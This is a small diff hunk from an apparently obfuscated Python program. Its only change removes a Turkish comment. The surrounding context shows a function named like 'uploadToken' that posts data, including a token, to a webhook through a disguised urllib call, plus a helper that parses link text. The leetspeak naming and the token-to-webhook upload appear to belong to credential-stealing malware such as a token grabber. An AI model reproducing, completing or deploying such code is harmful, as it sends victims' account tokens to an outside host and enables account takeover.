@@ -429,7 +429,7 @@ def upl05dT4k31(t0k3n, path):
         }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
 
-#hersey son defa :(
+
 def R4f0rm3t(listt):
     e = re.findall("(\w+[a-z])",listt)
     while "https" in e: e.remove("https")
